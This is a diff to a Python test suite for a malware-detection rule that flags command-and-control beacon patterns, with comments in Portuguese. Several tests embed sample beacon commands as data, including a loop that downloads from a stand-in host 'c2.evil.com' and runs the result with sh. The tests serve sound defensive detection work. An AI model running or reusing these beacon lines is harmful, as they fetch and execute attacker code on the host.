@@ -416,8 +416,34 @@ class TestRuleH019C2Beacon:
         ctx = _ctx(content=b"while true; do sleep 60; curl http://c2.evil.com/cmd; done")
         assert _r_c2_beacon(ctx, "H019") is not None
 
+    def test_curl_then_sleep_triggers(self) -> None:
+        # ordem inversa: faz a requisição primeiro, depois dorme — padrão
+        # real de beacon tão comum quanto "sleep antes", não era detectado
+        # antes da correção (regex exigia só uma ordem específica).
+        ctx = _ctx(
+            content=b"while true; do curl -s http://c2.evil.com/cmd -o /tmp/c; "
+                    b"sh /tmp/c; sleep 60; done"
+        )
+        assert _r_c2_beacon(ctx, "H019") is not None
+
+    def test_wget_then_sleep_triggers(self) -> None:
+        ctx = _ctx(content=b"wget -q http://c2.evil.com/beacon; sleep 120")
+        assert _r_c2_beacon(ctx, "H019") is not None
+
     def test_no_pattern_no_trigger(self) -> None:
         ctx = _ctx(content=b"sleep 5  # just a wait")
+        assert _r_c2_beacon(ctx, "H019") is None
+
+    def test_sleep_near_word_containing_nc_does_not_trigger(self) -> None:
+        # falso-positivo real da versão anterior: "nc" batia como
+        # substring de "function"/"sync"/"balance"/"announce" mesmo sem
+        # nenhum uso de rede de verdade, gerando quarentena automática
+        # crítica indevida.
+        ctx = _ctx(content=b"sleep 30\nfunction cleanup() { echo done; }\ncleanup")
+        assert _r_c2_beacon(ctx, "H019") is None
+
+    def test_sleep_near_sync_word_does_not_trigger(self) -> None:
+        ctx = _ctx(content=b"sleep 10; rsync -av /data/ /backup/; balance_check")
         assert _r_c2_beacon(ctx, "H019") is None
 
 
